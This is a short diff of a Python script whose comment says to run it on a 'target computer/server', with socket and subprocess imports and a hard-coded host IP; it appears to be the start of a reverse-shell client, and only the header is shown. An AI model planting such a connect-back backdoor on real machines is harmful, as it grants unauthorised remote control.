@@ -1,7 +1,8 @@
-#Run this file on the target computer/server
+# Run this file on the target computer/server
 import os
 import socket
 import subprocess
+import time
 
 s = socket.socket()
 host = "192.168.1.6" # enter the ip of the computer/server
